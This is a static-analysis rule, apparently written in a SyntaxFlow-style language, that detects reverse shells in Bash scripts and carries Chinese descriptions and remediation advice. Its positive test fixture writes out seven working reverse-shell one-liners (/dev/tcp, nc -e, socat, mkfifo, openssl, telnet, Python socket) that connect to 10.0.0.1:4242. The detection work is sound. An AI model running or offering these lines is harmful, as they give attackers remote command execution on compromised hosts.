desc(
	mode: "ssa"
	language: "bash"
	title: "Bash: reverse shell or remote command channel"
	title_zh: "Bash：反弹 Shell 或远程命令通道"
	type: vuln
	level: "high"
	rule_id: "bash-remote-shell"
	risk: "command-execution"
	desc: <<<DESC
### 说明
命令建立了交互式远程通道或反弹 Shell：`/dev/tcp` 重定向、`nc -e`、
`socat ... EXEC`、`mkfifo` 管道、`openssl s_client`、`telnet` 管道，
或 python/perl/php/ruby/node 等解释器内联的 socket 代码。这类命令通常
意味着攻击者已经能执行任意命令，并试图获得持久交互能力。
DESC
	solution: <<<SOLUTION
### 修复建议
立即隔离主机，检查异常外连和进程；禁止在业务脚本中出现反向连接、
`/dev/tcp`、`nc -e` 等模式。生产环境应通过出站网络策略限制非业务端口。
SOLUTION
	reference: <<<REFERENCE
[CWE-78](https://cwe.mitre.org/data/definitions/78.html)
REFERENCE
	alert_min: 1
	"file://pos.sh": <<<POS
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
nc -e /bin/sh 10.0.0.1 4242
socat TCP:10.0.0.1:4242 EXEC:/bin/sh
mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4242 >/tmp/f
openssl s_client -quiet -connect 10.0.0.1:4242
telnet 10.0.0.1 8080 | /bin/sh | telnet 10.0.0.1 8081
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.1",4242));subprocess.call(["/bin/sh","-i"])'
POS
	"safefile://neg.sh": <<<NEG
curl -fsSL https://example.com/x.sh | tar -xzf -
nc -z example.com 443
openssl version
python -c 'print("hello")'
ssh example.com
NEG
)

*?{have: /\/dev\/tcp\//} as $devTcpHit

/^(nc|ncat|netcat)$/ as $nc
$nc(* as $ncArgs) as $ncCall
$ncCall?{any: /"-e"/, /"-c"/} as $ncHit

socat(* as $socatArgs) as $socatCall
$socatCall?{have: /(?i)(exec:|tcp-connect:)/} as $socatHit

mkfifo(* as $mkfifoArgs) as $mkfifoHit

openssl(* as $opensslArgs) as $opensslCall
$opensslCall?{have: /s_client/} as $opensslHit

/^(sh|bash|zsh|dash|ksh|ash)$/ as $shell
$shell(* as $shellArgs) as $shellCall
$shellCall?{have: /telnet/} as $telnetHit

/^(python[0-9.]*|perl|ruby|php|node|nodejs|lua)$/ as $interp
$interp(* as $interpArgs) as $interpCall
$interpCall?{any: /socket/, /fsockopen/, /TCPSocket/, /child_process/, /\/dev\/tcp\//} as $interpHit

alert $devTcpHit for {
	level: "high",
	title: "Bash: reverse shell or remote command channel",
	title_zh: "Bash：反弹 Shell 或远程命令通道",
	message: "检测到 /dev/tcp 远程通道。",
	risk: "command-execution",
}

alert $ncHit for {
	level: "high",
	title: "Bash: reverse shell or remote command channel",
	title_zh: "Bash：反弹 Shell 或远程命令通道",
	message: "检测到 nc/ncat 携带 -e/-c 执行参数。",
	risk: "command-execution",
}

alert $socatHit for {
	level: "high",
	title: "Bash: reverse shell or remote command channel",
	title_zh: "Bash：反弹 Shell 或远程命令通道",
	message: "检测到 socat 执行远程命令。",
	risk: "command-execution",
}

alert $mkfifoHit for {
	level: "high",
	title: "Bash: reverse shell or remote command channel",
	title_zh: "Bash：反弹 Shell 或远程命令通道",
	message: "检测到 mkfifo，常见于反弹 Shell 管道。",
	risk: "command-execution",
}

alert $opensslHit for {
	level: "high",
	title: "Bash: reverse shell or remote command channel",
	title_zh: "Bash：反弹 Shell 或远程命令通道",
	message: "检测到 openssl s_client 远程连接。",
	risk: "command-execution",
}

alert $telnetHit for {
	level: "high",
	title: "Bash: reverse shell or remote command channel",
	title_zh: "Bash：反弹 Shell 或远程命令通道",
	message: "检测到 telnet 输出进入 shell。",
	risk: "command-execution",
}

alert $interpHit for {
	level: "high",
	title: "Bash: reverse shell or remote command channel",
	title_zh: "Bash：反弹 Shell 或远程命令通道",
	message: "检测到解释器内联 socket/fsockopen 代码。",
	risk: "command-execution",
}